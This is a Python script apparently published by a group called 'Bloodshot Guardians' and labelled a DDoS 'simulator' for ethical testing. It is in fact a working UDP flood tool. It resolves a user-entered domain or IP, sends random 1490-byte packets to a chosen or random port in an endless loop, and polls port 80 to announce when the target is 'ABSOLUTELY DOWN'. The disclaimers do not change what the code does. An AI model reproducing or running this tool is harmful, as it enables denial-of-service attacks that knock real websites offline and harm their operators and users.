# Bloodshot Guardians - Ultimate Enhanced DDoS Simulator
# For ethical penetration testing & educational purposes ONLY

from platform import system
import os
import time
import random
import socket
import threading
import sys
from tqdm import tqdm  # pip install tqdm (যদি না থাকে)

# ======================== CONFIGURATION ========================
VERSION = "1.6"
TEAM_NAME = "Bloodshot Guardians"
SLOGAN = "Blood-Eyed Protectors – Tremor for Hackers, Shield for Faith & Nation"

# Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
PURPLE = "\033[95m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"

# Platform clear
IS_WINDOWS = system() == "Windows"
CLEAR_CMD = "cls" if IS_WINDOWS else "clear"

def clear_screen():
    os.system(CLEAR_CMD)

# ======================== GLOBAL VARIABLES ========================
sock = None
bytes_data = None
attack_running = False
down_time = None
pbar = None
last_ping_time = 0.0

# ======================== ADVANCED STATISTICS FUNCTION ========================
def show_statistics(target_ip, port_mode, port, packets_sent, start_time):
    elapsed = time.time() - start_time
    speed = packets_sent / elapsed if elapsed > 0 else 0
    
    intensity = "Shadow Level" if packets_sent < 10000 else "Medium Storm" if packets_sent < 100000 else "Apocalypse Mode"
    est_down_sec = "Calculating..." if speed == 0 else f"~{max(0, int((1000000 - packets_sent) / speed))} sec"
    botnet_size = "Small Botnet" if packets_sent < 50000 else "Medium Botnet" if packets_sent < 500000 else "Massive Botnet"
    simulated_load = min(100, speed * 0.01)
    power_level = min(10, int(speed / 100) + 1)
    power_bar = "■" * power_level + "□" * (10 - power_level)
    bandwidth_gb = (packets_sent * 1490) / (1024 ** 3)
    ping_display = f"{last_ping_time:.2f}ms" if last_ping_time > 0 else "N/A"
    panic_mode = "PANIC MODE ACTIVATED!" if packets_sent > 5000 else ""
    status = f"{GREEN}ACTIVE{RESET}" if down_time is None else f"{RED}ABSOLUTELY DOWN after {int(down_time - start_time)} sec{RESET}"
    
    # বড় বক্স (প্রস্থ আরও বাড়ানো)
    print(f"\n{YELLOW}{BOLD}╔════════════════════════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{YELLOW}║{RESET}  Target IP                  : {CYAN}{target_ip:<70}{RESET}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Port Mode                  : {'Specific' if port_mode else 'Random Ports'} ({port if port_mode else 'Auto'}){RESET:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Packets Sent               : {GREEN}{packets_sent:,}{RESET:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Packets/Sec                 : {GREEN}{speed:.2f}{RESET:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Running Time                : {GREEN}{int(elapsed // 60)}m {int(elapsed % 60)}s{RESET:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Intensity Level             : {RED}{intensity:<70}{RESET}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Est. Down Time              : {YELLOW}{est_down_sec:<70}{RESET}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Botnet Size                 : {PURPLE}{botnet_size:<70}{RESET}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Simulated Load              : {GREEN}{simulated_load:.1f}%{RESET:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Attack Power                : Level {power_level}/10 {RED}{power_bar}{RESET:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Bandwidth Sent              : {CYAN}{bandwidth_gb:.2f} GB{RESET:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Last Ping Time              : {YELLOW}{ping_display:<70}{RESET}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Target Panic                : {RED}{panic_mode:<70}{RESET}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Status                      : {status:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}╚════════════════════════════════════════════════════════════════════════════════════════════╝{RESET}\n")

# ======================== DOWN CHECK THREAD ========================
def check_down(target_ip, start_time):
    global down_time, last_ping_time
    while attack_running:
        try:
            ping_start = time.time()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target_ip, 80))
            s.close()
            last_ping_time = (time.time() - ping_start) * 1000
        except:
            if down_time is None:
                down_time = time.time()
                print(f"\n{RED}{BOLD}TARGET ABSOLUTELY DOWN DETECTED!{RESET}")
                print(f"{YELLOW}Absolutely Down after approximately {int(time.time() - start_time)} seconds{RESET}\n")
            break
        time.sleep(10)

# ======================== BANNER FUNCTION ========================
def print_banner():
    clear_screen()
    print(f"{RED}╔════════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{RED}║      {PURPLE}{BOLD}B L O O D S H O T   G U A R D I A N S{RESET}                                   ║{RESET}")
    print(f"{RED}║         {CYAN}{BOLD}{SLOGAN}{RESET}         ║{RESET}")
    print(f"{RED}║         Bloodshot Eyes – Unbreakable Defenders of Faith & Nation         ║{RESET}")
    print(f"{RED}║                              Version: {VERSION}                               ║{RESET}")
    print(f"{RED}╚════════════════════════════════════════════════════════════════════════════╝{RESET}\n")

# ======================== MAIN PROGRAM ========================
print_banner()

print(f"{GREEN}Author: {RED}{BOLD}Bloodshot Guardians Team{RESET}")
print(f"Channel: {CYAN}https://t.me/BloodshotGuardiansBD{RESET}")
print("Purpose: Legal & Ethical Penetration Testing Only\n")

# Menu Loop
ip = None
while True:
    print(f"{GREEN}{BOLD}[1]{RESET} Target Website Domain")
    print(f"{GREEN}{BOLD}[2]{RESET} Target IP Address")
    print(f"{GREEN}{BOLD}[3]{RESET} About Bloodshot Guardians")
    print(f"{GREEN}{BOLD}[4]{RESET} Exit\n")

    choice = input(f"{WHITE}Select option > {RESET}")

    if choice == '1':
        domain = input(f"{CYAN}Enter Domain: {RESET}")
        try:
            ip = socket.gethostbyname(domain)
            print(f"{GREEN}Resolved IP: {ip}{RESET}")
            break
        except:
            print(f"{RED}Error: Invalid domain!{RESET}")
            time.sleep(2)

    elif choice == '2':
        ip = input(f"{CYAN}Enter IP Address: {RESET}")
        break

    elif choice == '3':
        clear_screen()
        print(f"{RED}{BOLD}Bloodshot Guardians{RESET}")
        print(f"{CYAN}Blood-Eyed Protectors – Invincible, Invisible, Unbreakable{RESET}\n")
        print("We are the guardians of faith and nation in the digital world.")
        print("Our mission: Protect our people and values from cyber threats.")
        print("This tool is strictly for authorized ethical testing and self-defense.\n")
        print(f"{RED}WARNING:{RESET} Illegal use is strictly prohibited.")
        print("The Bloodshot Guardians team bears no responsibility for misuse.\n")
        input("\nPress Enter to continue...")
        print_banner()

    elif choice == '4':
        print(f"{RED}Exiting...{RESET}")
        sys.exit(0)

    else:
        print(f"{RED}Invalid choice!{RESET}")
        time.sleep(1.5)

# Port configuration
use_specific_port = False
target_port = 80

while True:
    choice = input(f"{WHITE}Use specific port? [y/n]: {RESET}").lower()
    if choice == 'y':
        use_specific_port = True
        try:
            target_port = int(input(f"{CYAN}Enter port (1-65535): {RESET}"))
            break
        except:
            print(f"{RED}Invalid! Default 80.{RESET}")
            break
    elif choice == 'n':
        break
    else:
        print(f"{RED}y or n only.{RESET}")

# Attack start
clear_screen()
print(f"{CYAN}Bloodshot Guardians INITIALIZING...{RESET}")
time.sleep(1.5)
print(f"{RED}{BOLD}BLOODSHOT EYES ACTIVATED{RESET}")
time.sleep(2.5)
print(f"{YELLOW}Target locked: {ip}{RESET}\n")

packets_sent = 0
start_time = time.time()
attack_running = True

# Create socket safely
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1490)
except Exception as e:
    print(f"{RED}Socket creation failed: {e}{RESET}")
    sys.exit(1)

# Progress bar
pbar = tqdm(total=1000000, desc="Attack Progress", unit="pkt", leave=True)

# Start down check thread
down_thread = threading.Thread(target=check_down, args=(ip, start_time))
down_thread.daemon = True
down_thread.start()

try:
    while attack_running:
        if use_specific_port:
            sock.sendto(bytes_data, (ip, target_port))
        else:
            current_port = random.randint(1, 65535)
            if current_port == 1900:
                current_port = 1901
            sock.sendto(bytes_data, (ip, current_port))

        packets_sent += 1
        pbar.update(1)

        if packets_sent % 50 == 0:
            clear_screen()
            print_banner()
            show_statistics(ip, use_specific_port, target_port if use_specific_port else 'Random', packets_sent, start_time)

except KeyboardInterrupt:
    attack_running = False
    if sock:
        sock.close()
    if pbar:
        pbar.close()
    clear_screen()
    print_banner()
    show_statistics(ip, use_specific_port, target_port if use_specific_port else 'Random', packets_sent, start_time)
    print(f"\n{GREEN}{BOLD}CTRL+C detected! Mission safely stopped.{RESET}")
    print(f"{YELLOW}Bloodshot Guardians exited cleanly.{RESET}\n")
    sys.exit(0)

except Exception as e:
    attack_running = False
    if sock:
        sock.close()
    if pbar:
        pbar.close()
    clear_screen()
    print(f"\n{RED}Error: {e}{RESET}")
    print(f"{YELLOW}Bloodshot Guardians exited safely.{RESET}")
    sys.exit(1)